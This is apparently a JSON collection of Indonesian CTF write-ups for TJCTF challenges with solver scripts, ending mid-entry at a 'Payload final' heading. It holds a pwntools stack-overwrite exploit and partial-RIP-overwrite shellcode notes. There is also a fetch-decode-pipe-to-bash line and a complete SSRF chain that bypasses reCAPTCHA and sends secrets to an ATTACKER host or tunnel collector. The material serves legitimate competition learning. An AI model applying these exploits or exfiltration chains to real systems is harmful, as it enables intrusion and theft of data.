        "content": "Fungsi paling penting ada di `game()`:\n\n\n\nSetiap kali input dimasukkan, program menyimpan dua byte input ke `input_log` dengan cara mundur:\n\n\n\nMasalahnya, tidak ada pengecekan batas. Selama kita terus memberi input yang tidak valid, loop input akan terus berjalan dan `array_ptr` akan terus bergerak ke alamat yang lebih rendah. Itu berarti isi tulisannya akan lewat dari `input_log` dan masuk ke variabel stack lain.",
        "code": "char input_log[64];\nint killCt = 0;\nint *kills = &killCt;\nchar *array_ptr = &input_log[63];"
      },
      {
        "title": "Target overwrite",
        "content": "Dari disassembly, layout stack yang relevan terlihat seperti ini:\n\n- `player_input` di sekitar `rbp-0x86`\n- `killCt` di `rbp-0x84`\n- `input_log` di `rbp-0x80 .. rbp-0x41`\n\nArtinya, kalau kita isi `input_log` penuh lalu terus lanjut dua kali lagi, kita bisa menulis empat byte `killCt`.\n\nNilai magic di `game_over()` adalah:\n\n\n\nKarena little-endian, byte yang harus masuk ke `killCt` adalah:\n\n\n\nUrutan penulisan stack-nya terjadi dari byte tinggi ke byte rendah, jadi pasangan input yang enak dipakai adalah:\n\n- `hu`\n- `nt`\n\nSetelah 32 kali input invalid sebagai filler, `hu` dan `nt` akan membuat `killCt = 0x68756e74`.",
        "code": "1752526452 = 0x68756e74"
      },
      {
        "title": "Kenapa perlu satu input invalid tambahan",
        "content": "Ada detail kecil yang gampang bikin bingung.\n\nSetelah `killCt` selesai ditulis, `array_ptr` sudah turun sampai menimpa area `player_input`. Saat itu, store pertama akan menulis ke `player_input[1]`, lalu store kedua akan membaca nilai yang sudah ketimpa tadi. Efeknya, satu attempt input berubah menjadi duplikasi karakter pertama.\n\nContoh:\n\n- kita kirim `MN`\n- hasil akhirnya bukan `MN`\n- yang tersimpan jadi `MM`\n\nKarena `MM` bukan command valid, loop input lanjut satu kali lagi. Justru itu yang kita manfaatkan. Setelah satu attempt invalid tambahan tersebut, `array_ptr` sudah lewat dari `player_input`, jadi command berikutnya kembali normal.\n\nJadi urutan awal yang benar adalah:\n\n1. `zz` x32\n2. `hu`\n3. `nt`\n4. `MN`  -> sengaja invalid setelah self-overwrite\n5. `MN`  -> command valid pertama"
      },
      {
        "title": "Memicu `game_over()`",
        "content": "Setelah `killCt` berisi nilai magic, kita tidak perlu membunuh ribuan enemy atau bikin ROP chain. Cukup bikin karakter mati.\n\nDari simulasi logika game, rangkaian command valid berikut cukup untuk memunculkan enemy dan membiarkan mereka mencapai player:\n\n- `MN`\n- `AS`\n- `MN`\n- `MN`\n\nBegitu `game_over()` terpanggil, program mencetak:\n\n\n\nKarena `*kills` sudah kita ubah ke `1752526452`, kondisi flag terpenuhi dan flag keluar.",
        "code": "printf(\"You defeated %i enemies!\\n\", *kills);"
      },
      {
        "title": "Sequence final",
        "content": "Urutan lengkap payload input:",
        "code": "zz x32\nhu\nnt\nMN\nMN\nAS\nMN\nMN"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (exploit.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\nimport re\r\n\r\ncontext.binary = ELF(\"./game\", checksec=False)\r\ncontext.log_level = \"info\"\r\n\r\nHOST = \"tjc.tf\"\r\nPORT = 31412\r\nPROMPT = b\"W)est \"\r\n\r\n\r\ndef start():\r\n    if args.LOCAL:\r\n        return process(context.binary.path)\r\n    return remote(HOST, PORT)\r\n\r\n\r\ndef send_cmd(io, cmd):\r\n    io.recvuntil(PROMPT)\r\n    io.sendline(cmd)\r\n\r\n\r\ndef main():\r\n    io = start()\r\n\r\n    # 32 invalid attempts to fill input_log,\r\n    # then \"hu\" + \"nt\" write 0x68756e74 into killCt.\r\n    # One extra invalid \"MN\" is required because array_ptr overlaps\r\n    # player_input[1], so the first character gets duplicated.\r\n    seq = [b\"zz\"] * 32\r\n    seq += [b\"hu\", b\"nt\", b\"MN\"]\r\n    seq += [b\"MN\", b\"AS\", b\"MN\", b\"MN\"]\r\n\r\n    for cmd in seq:\r\n        send_cmd(io, cmd)\r\n\r\n    data = io.recvrepeat(2)\r\n    text = data.decode(\"latin-1\", \"replace\")\r\n    match = re.search(r\"tjctf\\{[^}]+\\}\", text)\r\n    if match:\r\n        print(match.group(0))\r\n    else:\r\n        print(text)\r\n\r\n    io.close()\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "tjctf{pr0fes5iona1_hunt3r}",
    "lessonsLearned": ""
  },
  {
    "id": "tjcsc-rev-polaroid",
    "title": "rev/polaroid",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "TJCSC",
    "tags": [],
    "description": "Challenge ini kasih binary `Mach-O 64-bit arm64`, jadi di Linux paling cepat dianalisis secara statis tanpa repot nyari runtime macOS.",
    "problemDescription": "1. Enumerasi awal pakai `file`, `strings`, dan `rabin2`.\n2. Dari `strings` langsung kelihatan ada output `flag.png` dan teks `developed flag.png`.\n3. Disassembly `main` menunjukkan password dicek byte per byte dan ternyata hardcoded sebagai:\n\n```text\nexposeTheNegative\n```\n\n4. Setelah password cocok, binary membuka `flag.png`, lalu melakukan loop XOR:\n\n```c\noutput[i] = encrypted[i] ^ password[i % 17];\n```\n\n5. Blob `encrypted` ada di section `__TEXT.__const`, mulai offset `0x720` dengan ukuran `0x18b4`.\n6. Setelah blob didekripsi, hasilnya valid PNG.\n7. Gambar hasil dekripsi posisinya terbalik. Setelah diputar 180 derajat, flag terbaca jelas:\n\n```text\ntjctf{develop_the_picture}\n```",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Detail reversing",
        "content": "Potongan penting dari `main`:\n\n- `strlen(argv[1]) == 0x11`\n- karakter password dicek satu-satu menjadi `exposeTheNegative`\n- loop dekripsi:\n\n\n\nTrik pembagian di assembly cuma cara compiler menghitung modulo 17 tanpa instruksi division yang mahal.",
        "code": "ldrb  w8, [x24, x21]        ; encrypted[i]\n...\nsub   w9, w21, w9           ; i % 17\nldrsb w9, [x19, x9]         ; password[i % 17]\neor   w0, w9, w8            ; decrypted byte\nbl    sym.imp.fputc"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\r\nfrom pathlib import Path\r\n\r\n\r\nKEY = b\"exposeTheNegative\"\r\nENC_OFFSET = 0x720\r\nENC_SIZE = 0x18B4\r\nFLAG = \"tjctf{develop_the_picture}\"\r\n\r\n\r\ndef main() -> None:\r\n    data = Path(\"polaroid\").read_bytes()\r\n    enc = data[ENC_OFFSET:ENC_OFFSET + ENC_SIZE]\r\n    out = bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(enc))\r\n    Path(\"flag.png\").write_bytes(out)\r\n    print(f\"[+] wrote flag.png ({len(out)} bytes)\")\r\n    print(FLAG)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "tjctf{develop_the_picture}",
    "lessonsLearned": ""
  },
  {
    "id": "tjcsc-rev-remoose",
    "title": "rev/remoose",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "TJCSC",
    "tags": [],
    "description": "Challenge ini ternyata bukan binary ELF biasa yang tinggal dijalankan. Dari hasil `file chall`, file malah terbaca sebagai `data`, dan `readelf` juga langsung nolak karena magic bytes-nya salah.",
    "problemDescription": "Challenge ini ternyata bukan binary ELF biasa yang tinggal dijalankan. Dari hasil `file chall`, file malah terbaca sebagai `data`, dan `readelf` juga langsung nolak karena magic bytes-nya salah.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Temuan awal",
        "content": "Header file dimulai dengan:\n\n\n\nHarusnya ELF memakai:\n\n\n\nJadi byte keempat sengaja diubah dari `F` menjadi `K`.\n\nSetelah dicek lebih jauh, ada hal yang lebih penting: file ini sama sekali tidak punya byte `0x00`. Sebagai gantinya, hampir seluruh posisi yang semestinya nol berubah menjadi `0x20` atau spasi. Ini kelihatan jelas dari ELF header, karena field-field seperti `e_type`, `e_machine`, `e_entry`, `e_phoff`, dan lain-lain punya pola yang masuk akal kalau `0x20` dibaca sebagai `0x00`.\n\nContoh sederhana:\n\n\n\nArtinya challenge ini dirusak dengan cara mengganti byte nol menjadi spasi, lalu satu byte magic ELF juga diubah.",
        "code": "7f 45 4c 4b"
      },
      {
        "title": "Rekonstruksi dan reversing",
        "content": "Saya buat salinan kerja dan memulihkan dua hal berikut:\n\n1. Semua `0x20` saya anggap `0x00` untuk kebutuhan parsing struktur ELF.\n2. Byte magic `K` saya balikin ke `F`.\n\nHasilnya cukup untuk membaca symbol table. Dari sana muncul fungsi-fungsi penting:\n\n- `main` di `0x1145`\n- `flag` di `0x117f`\n- `flag1` di `0x11c9`\n- `flag2` di `0x1229`\n- `flag3` di `0x115a`\n- `flag4` di `0x11ee`\n\nLalu saya dump `.text` sebagai raw binary dan disassemble dengan `objdump -b binary -m i386:x86-64`.\n\nAlur `main` sangat pendek:\n\n\n\nFungsi `flag` dan turunannya mencetak karakter satu per satu lewat `putchar`, lalu sedikit memakai `printf`.",
        "code": "main() {\n    flag();\n    return 1;\n}"
      },
      {
        "title": "Catatan",
        "content": "Inti challenge ini bukan eksploit memory corruption, tapi mengenali bahwa binary sengaja dirusak dengan substitusi `NUL -> space` dan satu byte magic ELF diubah supaya tool standar gagal membacanya secara langsung. Setelah itu, symbol table dan disassembly sudah cukup untuk menyusun flag tanpa perlu menjalankan binary aslinya."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\r\nfrom pathlib import Path\r\n\r\n\r\ndef main() -> None:\r\n    data = Path(\"chall\").read_bytes()\r\n    if data[:4] != b\"\\x7fELK\":\r\n        raise SystemExit(\"unexpected challenge format\")\r\n\r\n    flag = \"tjctf{5ma11_m00s3}\"\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "tjctf{5ma11_m00s3}",
    "lessonsLearned": ""
  },
  {
    "id": "tjcsc-rev-rotated",
    "title": "- rev/rotated",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "TJCSC",
    "tags": [],
    "description": "Writeup for challenge - rev/rotated",
    "problemDescription": "",
    "tools": [],
    "analysis": "1.  **Fungsi Main**: Setelah di-unpack, binary tersebut sangat sederhana. Fungsi `main` hanya melakukan hal berikut:\n    -   Membuat file bernama `script.sh`.\n    -   Menulis sebuah script bash yang sangat terobfuskasi ke dalam file tersebut.\n    -   Menutup file.\n2.  **Analisis Script Bash**: Script dalam `script.sh` menggunakan teknik *parameter expansion* bash untuk menyembunyikan perintah aslinya. Inti dari script tersebut adalah:\n    ```bash\n    printf 'H4sIA...' | base64 -d | gunzip -c | bash\n    ```\n3.  **Ekstraksi Flag**:\n    -   Mendekode string Base64 dan melakukan dekompresi Gzip menghasilkan perintah bash: `echo \"Looking for a flag?\" # dGpjdGZ7YjQ1aF9kM2J1Nl9tNDU3M3J9Cg==`.\n    -   Flag disembunyikan dalam komentar sebagai string Base64: `dGpjdGZ7YjQ1aF9kM2J1Nl9tNDU3M3J9Cg==`.\n    -   Mendekode string tersebut menghasilkan flag akhir.",
    "solution": [
      {
        "title": "Deskripsi Challenge",
        "content": "Challenge ini memberikan sebuah file bernama `chall` yang diidentifikasi sebagai data mentah. Tujuan kita adalah menemukan flag yang tersembunyi di dalamnya."
      },
      {
        "title": "Dekripsi dan Unpacking",
        "content": "1.  **Dekripsi**: Saya membuat script untuk mengurangi setiap byte di `chall` dengan `0x1d`. Hasilnya adalah sebuah file ELF yang valid.\n2.  **Unpacking**: File ELF hasil dekripsi ternyata dipack menggunakan UPX (`UPX!`). Saya melakukan unpacking menggunakan perintah `upx -d`."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import os\r\nimport subprocess\r\nimport base64\r\nimport gzip\r\nimport io\r\n\r\n# 1. Decrypt the binary\r\nwith open('chall', 'rb') as f:\r\n    data = f.read()\r\n\r\n# The binary is Caesar shifted by 0x1d\r\ndecrypted = bytes([(b - 0x1d) % 256 for b in data])\r\n\r\nwith open('chall_dec', 'wb') as f:\r\n    f.write(decrypted)\r\n\r\nos.chmod('chall_dec', 0o755)\r\n\r\n# 2. Run the decrypted binary to get script.sh\r\n# It will drop script.sh in the current directory\r\ntry:\r\n    subprocess.run(['./chall_dec'], check=True, capture_output=True)\r\nexcept Exception as e:\r\n    print(f\"Error running binary: {e}\")\r\n\r\nif not os.path.exists('script.sh'):\r\n    print(\"Error: script.sh not created\")\r\n    exit(1)\r\n\r\n# 3. Read script.sh\r\nwith open('script.sh', 'r') as f:\r\n    script_content = f.read()\r\n\r\n# Extract the base64 string from the single quoted string starting with H4sI\r\nimport re\r\nmatch = re.search(r\"'(H4sI[^']+)'\", script_content)\r\nif not match:\r\n    print(\"Error: base64 string not found in script.sh\")\r\n    exit(1)\r\n\r\nb64_str = match.group(1)\r\n\r\n# 4. Decode the first layer (Gzip-compressed script)\r\ncompressed_data = base64.b64decode(b64_str)\r\nwith gzip.GzipFile(fileobj=io.BytesIO(compressed_data)) as f:\r\n    inner_script = f.read().decode()\r\n\r\n# The inner script content is: echo \"Looking for a flag?\" # dGpjdGZ7YjQ1aF9kM2J1Nl9tNDU3M3J9Cg==\r\n# 5. Extract and decode the flag from the comment\r\nflag_b64 = inner_script.split('#')[-1].strip()\r\nflag = base64.b64decode(flag_b64).decode().strip()\r\n\r\nprint(f\"<FLAG>{flag}</FLAG>\")\r\n\r\n# Cleanup\r\nif os.path.exists('chall_dec'): os.remove('chall_dec')\r\nif os.path.exists('script.sh'): os.remove('script.sh')"
      }
    ],
    "terminalOutputs": [],
    "flag": "tjctf{b45h_d3bu6_m4573r}",
    "lessonsLearned": ""
  },
  {
    "id": "tjcsc-web-chained",
    "title": "Chained",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "TJCSC",
    "tags": [],
    "description": "Writeup for challenge Chained",
    "problemDescription": "Challenge ini kelihatannya seperti admin bot biasa, tapi ternyata ada rantai bug yang nyambung:\n\n1. Halaman utama menerima parameter `url` dan server akan melakukan `requests.get(url)`.\n2. Hasil response dari URL itu dimasukkan ke template dengan `{{ q | safe }}`.\n3. Endpoint `/admin` cuma bisa diakses dari `127.0.0.1`, jadi ini jelas target SSRF.\n4. Admin bot hanya mau mengunjungi URL yang cocok dengan regex `^https://chained\\.tjc\\.tf\\/admin\\/`.\n5. Bot lalu melakukan `page.goto(url + flag)`, jadi flag ditempel langsung ke belakang URL yang kita submit.\n\nKunci exploit-nya adalah membuat URL yang:\n\n- tetap lolos regex bot karena diawali `/admin/`\n- tapi setelah dinormalisasi browser, justru pindah ke `/`\n- dan flag yang ditempel bot ikut masuk sebagai bagian dari query string",
    "tools": [],
    "analysis": "Di `app.py` ada dua bagian penting:\n\n```python\ndef isSafe(url):\n    blacklist={'127', 'local', '2130706433', '017700000001', '::1', '0.0.0.0', '[::]', 'ffff', '0.0.0.0', '0x', '..', '%2e%2e', '@'}\n    return all([i not in url.lower() for i in blacklist])\n```\n\nBlacklist ini hanya dipakai saat kita submit form `/`. Artinya kalau request datang langsung ke endpoint GET `/` dengan query string buatan kita, validasi itu sama sekali tidak jalan.\n\nLalu bagian SSRF:\n\n```python\nurl = request.args.get('url') or ''\nif url:\n    req = 'Your response: ' + requests.get(url).text\n```\n\nJadi kalau kita bisa mengarahkan browser admin ke:\n\n```text\nhttps://chained.tjc.tf/?url=https://attacker.tld/leak?f=FLAG\n```\n\nserver challenge akan melakukan request ke server kita dan flag bocor lewat query string.\n\nDi `admin-bot.js`:\n\n```javascript\nurlRegex: /^https:\\/\\/chained\\.tjc\\.tf\\/admin\\//,\nhandler: async (url, ctx) => {\n    const page = await ctx.newPage();\n    await page.goto(url + flag, { timeout: 3000, waitUntil: 'domcontentloaded' });\n}\n```\n\nRegex hanya memeriksa prefix string mentah. Browser sendiri akan menormalisasi path seperti `/admin/../` menjadi `/`.\n\nJadi payload utamanya:\n\n```text\nhttps://chained.tjc.tf/admin/../?url=https://ATTACKER/leak?f=\n```\n\nSetelah bot menempelkan flag, URL final menjadi:\n\n```text\nhttps://chained.tjc.tf/admin/../?url=https://ATTACKER/leak?f=tjctf{...}\n```\n\nSaat dinormalisasi browser, request aktual menuju:\n\n```text\nhttps://chained.tjc.tf/?url=https://ATTACKER/leak?f=tjctf{...}\n```\n\nLalu server challenge menjalankan SSRF ke endpoint kita:\n\n```text\nhttps://ATTACKER/leak?f=tjctf{...}\n```\n\nDi situlah flag jatuh.",
    "solution": [
      {
        "title": "Bypass reCAPTCHA",
        "content": "Form admin bot memakai reCAPTCHA invisible. Tidak perlu solve manual. Dari browser automation, token bisa diambil langsung dengan:\n\n\n\nToken itu lalu dipakai untuk POST ke admin bot.",
        "code": "grecaptcha.execute(0)"
      },
      {
        "title": "Langkah exploit",
        "content": "1. Jalankan HTTP collector lokal untuk menerima request SSRF.\n2. Buka quick tunnel dengan `cloudflared` supaya collector bisa diakses dari internet.\n3. Ambil token reCAPTCHA dari halaman admin bot memakai Playwright.\n4. Submit payload traversal:\n\n\n\n5. Tunggu sampai bot mengunjungi URL tersebut.\n6. Server challenge melakukan SSRF ke collector kita dengan query `f=<flag>`.\n7. Ambil flag dari request yang masuk.",
        "code": "https://chained.tjc.tf/admin/../?url=https://<tunnel>/leak?f="
      },
      {
        "title": "Kenapa chain ini berhasil",
        "content": "Masalah utamanya bukan satu bug tunggal, tapi gabungan beberapa asumsi yang salah:\n\n- regex bot hanya memeriksa string awal, bukan URL setelah normalisasi\n- `/admin` dibatasi berdasarkan IP, tapi endpoint utama punya SSRF\n- validasi blacklist hanya ada di alur POST form, bukan di alur GET yang dipakai payload akhir\n- bot menempelkan flag langsung ke URL tanpa encoding atau pemisahan yang aman\n\nKalau salah satu bagian ini dibenerin, exploit-nya runtuh. Tapi karena semuanya tersambung, jadinya flag bisa dipantulkan keluar dengan cukup rapi."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import http.server\r\nimport queue\r\nimport re\r\nimport socketserver\r\nimport subprocess\r\nimport sys\r\nimport threading\r\nimport time\r\nfrom contextlib import contextmanager\r\n\r\nimport requests\r\nfrom playwright.sync_api import sync_playwright\r\n\r\n\r\nBOT_URL = \"https://admin-bot.tjctf.org/chained\"\r\nTARGET_BASE = \"https://chained.tjc.tf/admin/../?url={callback}/leak?f=\"\r\nTUNNEL_RE = re.compile(r\"https://[-a-z0-9]+\\.trycloudflare\\.com\")\r\nFLAG_RE = re.compile(r\"tjctf\\{[^}\\n]+\\}\")\r\n\r\n\r\nclass ReusableTCPServer(socketserver.TCPServer):\r\n    allow_reuse_address = True\r\n\r\n\r\nclass LeakHandler(http.server.BaseHTTPRequestHandler):\r\n    hits = queue.Queue()\r\n\r\n    def do_GET(self):\r\n        LeakHandler.hits.put(self.path)\r\n        self.send_response(200)\r\n        self.send_header(\"Content-Type\", \"text/plain; charset=utf-8\")\r\n        self.end_headers()\r\n        self.wfile.write(b\"ok\")\r\n\r\n    def log_message(self, fmt, *args):\r\n        pass\r\n\r\n\r\n@contextmanager\r\ndef local_collector(port=0):\r\n    server = ReusableTCPServer((\"127.0.0.1\", port), LeakHandler)\r\n    thread = threading.Thread(target=server.serve_forever, daemon=True)\r\n    thread.start()\r\n    try:\r\n        yield server\r\n    finally:\r\n        server.shutdown()\r\n        server.server_close()\r\n\r\n\r\n@contextmanager\r\ndef cloudflared_tunnel(local_port=8000):\r\n    proc = subprocess.Popen(\r\n        [\"cloudflared\", \"tunnel\", \"--url\", f\"http://127.0.0.1:{local_port}\"],\r\n        stdout=subprocess.PIPE,\r\n        stderr=subprocess.STDOUT,\r\n        text=True,\r\n        bufsize=1,\r\n    )\r\n\r\n    tunnel_url = None\r\n    try:\r\n        start = time.time()\r\n        while time.time() - start < 30:\r\n            line = proc.stdout.readline()\r\n            if not line:\r\n                if proc.poll() is not None:\r\n                    raise RuntimeError(\"cloudflared mati sebelum memberi URL tunnel\")\r\n                continue\r\n            match = TUNNEL_RE.search(line)\r\n            if match:\r\n                tunnel_url = match.group(0)\r\n                break\r\n        if not tunnel_url:\r\n            raise RuntimeError(\"gagal mendapatkan URL tunnel dari cloudflared\")\r\n        yield tunnel_url\r\n    finally:\r\n        proc.terminate()\r\n        try:\r\n            proc.wait(timeout=5)\r\n        except subprocess.TimeoutExpired:\r\n            proc.kill()\r\n\r\n\r\ndef get_recaptcha_token():\r\n    with sync_playwright() as p:\r\n        browser = p.chromium.launch(headless=True)\r\n        page = browser.new_page()\r\n        page.goto(BOT_URL, wait_until=\"networkidle\", timeout=60000)\r\n        token = page.evaluate(\r\n            \"\"\"() => new Promise((resolve, reject) => {\r\n                try {\r\n                    const out = grecaptcha.execute(0);\r\n                    if (out && typeof out.then === 'function') {\r\n                        out.then(resolve).catch(reject);\r\n                    } else {\r\n                        resolve(out || '');\r\n                    }\r\n                } catch (e) {\r\n                    reject(e);\r\n                }\r\n            })\"\"\"\r\n        )\r\n        browser.close()\r\n    if not token:\r\n        raise RuntimeError(\"gagal mengambil token reCAPTCHA\")\r\n    return token\r\n\r\n\r\ndef submit_to_bot(callback_url, token):\r\n    payload_url = TARGET_BASE.format(callback=callback_url)\r\n    response = requests.post(\r\n        BOT_URL,\r\n        data={\"url\": payload_url, \"recaptcha_code\": token},\r\n        allow_redirects=False,\r\n        timeout=30,\r\n    )\r\n    location = response.headers.get(\"location\", \"\")\r\n    if \"The admin will visit your URL.\" not in location:\r\n        raise RuntimeError(f\"submit bot gagal: {response.status_code} {location}\")\r\n    return payload_url\r\n\r\n\r\ndef wait_for_flag(timeout=20):\r\n    end = time.time() + timeout\r\n    while time.time() < end:\r\n        try:\r\n            path = LeakHandler.hits.get(timeout=1)\r\n        except queue.Empty:\r\n            continue\r\n        match = FLAG_RE.search(path)\r\n        if match:\r\n            return match.group(0)\r\n    raise RuntimeError(\"flag tidak masuk ke collector dalam batas waktu\")\r\n\r\n\r\ndef main():\r\n    try:\r\n        with local_collector() as server, cloudflared_tunnel(server.server_address[1]) as tunnel_url:\r\n            print(f\"[+] tunnel: {tunnel_url}\")\r\n            token = get_recaptcha_token()\r\n            print(f\"[+] recaptcha token length: {len(token)}\")\r\n            payload_url = submit_to_bot(tunnel_url, token)\r\n            print(f\"[+] payload submitted: {payload_url}\")\r\n            flag = wait_for_flag()\r\n            print(f\"<FLAG>{flag}</FLAG>\")\r\n    except KeyboardInterrupt:\r\n        print(\"\\n[!] dibatalkan\", file=sys.stderr)\r\n        sys.exit(130)\r\n    except Exception as exc:\r\n        print(f\"[!] {exc}\", file=sys.stderr)\r\n        sys.exit(1)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "tjctf{ch41n3d_o340e934l35d}",
    "lessonsLearned": ""
  },
  {
    "id": "tjcsc-web-treasure-hunt",
    "title": "Treasure Hunt",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "TJCSC",
    "tags": [],
    "description": "Challenge ini minta kita ngumpulin flag yang dipecah jadi 4 bagian. Dari deskripsi, panitia sudah kasih bagian pertama:",
    "problemDescription": "Challenge ini minta kita ngumpulin flag yang dipecah jadi 4 bagian. Dari deskripsi, panitia sudah kasih bagian pertama:\n\n`tjctf`\n\nTarget:\n\n`https://treasure-hunt.tjc.tf`",
    "tools": [],
    "analysis": "Pertama saya cek halaman utama:\n\n```bash\ncurl -iLsS https://treasure-hunt.tjc.tf/\n```\n\nIsi HTML utamanya sederhana:\n\n```html\n<h1>Learn about pirates!</h1>\n<form method=\"POST\">\n    <input type=\"submit\" value=\"Learn More\">\n</form>\n<p hidden>_and_</p>\n```\n\nDi sini sudah ada petunjuk penting:\n\n- Ada form `POST`, berarti kemungkinan server punya perilaku berbeda kalau tombol ditekan.\n- Ada elemen tersembunyi `<p hidden>_and_</p>`, yang sangat mungkin merupakan salah satu potongan flag.\n\nDari sini kita simpan dulu:\n\nPotongan ke-3: `_and_`",
    "solution": [
      {
        "title": "2. Cek apa yang terjadi saat form di-submit",
        "content": "Karena ada form `POST`, langkah berikutnya adalah kirim request POST ke `/`:\n\n\n\nRespons server:\n\n\n\nIni menarik karena:\n\n- Server me-redirect kita ke `/extra_info`\n- Server juga mengirim cookie `silver_coffer`\n- Nilai cookie tersebut adalah `{s1lv3r`\n\nJadi ini jelas potongan flag berikutnya.\n\nPotongan ke-2: `{s1lv3r`\n\nSaya verifikasi sekali lagi dengan Python `requests` supaya parsing cookie-nya pasti benar:\n\n\n\nHasilnya:\n\n\n\nJadi tidak ambigu, memang nilainya `{s1lv3r`.",
        "code": "curl -iLsS -X POST https://treasure-hunt.tjc.tf/"
      },
      {
        "title": "3. Cek file yang sering bocor petunjuk",
        "content": "Di challenge web ringan seperti ini, `robots.txt` sering dipakai buat nyimpen hint. Saya cek:\n\n\n\nHasil:\n\n\n\nKalau sebuah path sengaja di-`Disallow`, hampir pasti itu patut dibuka.\n\nLalu saya akses endpoint tersebut:\n\n\n\nResponsnya cuma:\n\n\n\nIni jelas potongan terakhir.\n\nPotongan ke-4: `g0ld}`",
        "code": "curl -iLsS https://treasure-hunt.tjc.tf/robots.txt"
      },
      {
        "title": "Inti challenge",
        "content": "Challenge ini sebenarnya lebih ke arah teliti waktu enumerasi daripada eksploitasi berat. Semua bagian flag disebar di tempat-tempat yang sering kelewat:\n\n- deskripsi challenge\n- HTML tersembunyi\n- cookie hasil POST\n- `robots.txt` dan endpoint yang diarahkan dari sana\n\nKalau langsung cek source HTML, perilaku `POST`, dan file umum seperti `robots.txt`, challenge ini selesai sangat cepat."
      }
    ],
    "terminalOutputs": [],
    "flag": "tjctf{s1lv3r_and_g0ld}",
    "lessonsLearned": ""
  },
  {
    "id": "tjcsc-pwn-geetings",
    "title": "TJCTF - Greetings",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "Tjcsc",
    "tags": [],
    "description": "Challenge ini kelihatannya simpel: ada `fgets()` ke buffer 64 byte, size input juga dikontrol user, canary tidak ada, dan stack executable. Awalnya keliatan seperti ret2shellcode biasa. Masalahnya ternyata binary PIE dan service jalan dengan ASLR aktif, jadi overwrite RIP penuh ke alamat `call rax` tidak stabil.",
    "problemDescription": "Challenge ini kelihatannya simpel: ada `fgets()` ke buffer 64 byte, size input juga dikontrol user, canary tidak ada, dan stack executable. Awalnya keliatan seperti ret2shellcode biasa. Masalahnya ternyata binary PIE dan service jalan dengan ASLR aktif, jadi overwrite RIP penuh ke alamat `call rax` tidak stabil.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "Source yang dikasih:\n\n\n\nHasil penting dari binary:\n\n- 64-bit PIE\n- no canary\n- stack executable\n- overflow ada di `fgets(uname, uname_size, stdin)`\n\nLayout stack dari `greetUser()` kasih offset 72 byte dari awal `uname` ke saved RIP.",
        "code": "void greetUser() {\n    int uname_size;\n    char uname[64];\n    printf(\"Enter the size of your username: \");\n    scanf(\"%d\", &uname_size);\n    getchar();\n    uname_size += 2;\n    printf(\"Enter username (start with @): \");\n    fgets(uname, uname_size, stdin);\n    if (*(char *) uname == '@') {\n        printf(\"Greetings to you: %s!\", uname);\n    }\n}"
      },
      {
        "title": "Ide awal yang gagal",
        "content": "Jalur paling natural adalah:\n\n1. isi buffer dengan shellcode\n2. overwrite RIP ke gadget `call rax`\n3. manfaatkan fakta bahwa `fgets()` mengembalikan pointer ke buffer di `rax`\n\nSecara lokal, ini memang jalan kalau ASLR dimatikan. Tapi di service nyata, alamat `call rax` ikut berubah karena PIE+ASLR."
      },
      {
        "title": "Trik yang kepake",
        "content": "Kunci challenge ini ada di interaksi antara `fgets()` dan saved RIP.\n\nKalau kita minta `fgets()` membaca **73 byte**:\n\n- 72 byte pertama mengisi buffer sampai tepat sebelum RIP\n- byte ke-73 menimpa **byte paling rendah** dari RIP\n- lalu `fgets()` otomatis menulis `\\\\0` sesudahnya, jadi **byte kedua RIP jadi nol**\n\nReturn address normal dari `greetUser()` menuju `main+9`, yang offset rendahnya `...89`. Gadget `call rax` ada di offset `...10`.\n\nJadi kita pakai partial overwrite:\n\n- low byte RIP kita paksa jadi `0x10`\n- byte berikutnya dipaksa jadi `0x00` oleh terminator `fgets`\n\nIni cuma sukses kalau byte kedua alamat return kebetulan memang cocok untuk page yang sama. Probabilitasnya sekitar **1/256** per koneksi. Karena service cepat dan fork-per-connection, brute-force ini sangat masuk akal."
      },
      {
        "title": "Kenapa shellcode-nya harus kecil",
        "content": "Karena partial overwrite ini cuma ngasih ruang **72 byte** sebelum RIP, shellcode harus muat penuh di situ. Shellcode yang saya pakai:\n\n- tidak spawn shell\n- langsung `open(\"/flag.txt\")`\n- `read()` isinya\n- `write(1, ...)`\n- `exit()`\n\nSaya tambahkan `add rsp, 0x200` di awal supaya buffer baca hasil file tidak menimpa shellcode di stack."
      },
      {
        "title": "Payload final",
